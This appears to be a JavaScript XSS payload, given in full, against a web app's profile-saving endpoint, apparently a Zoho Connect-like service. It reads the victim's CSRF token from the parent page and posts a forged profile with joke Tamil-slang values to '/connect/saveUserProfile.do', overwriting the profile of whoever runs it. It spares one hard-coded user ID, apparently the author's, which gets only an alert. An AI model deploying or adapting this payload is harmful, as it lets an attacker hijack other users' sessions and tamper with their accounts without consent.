var test="{'scopeID':'"+scopeID+"','firstName':'Madhu','lastName':'Anand','aboutMe':'Onnum perusaa solrathukku illa','skills':'Eppavumey summa irukrathu','interests':'Summa iruka pudikum','workPhoneExtension':'108','workLocation':'JAPAN','departments':'Summa thaanga iruken','seatingLocation':'Summa thaanga iruken','jobTitle':'Summa Iruken','zpcpn':'"+parent.getCsrfToken()+"'}";
test=test.replace(/'/g,"\"");
test=JSON.parse(test);
if(parent.zuid.toString().indexOf('64330397') == -1){$.post('/connect/saveUserProfile.do',test);}else{alert()};
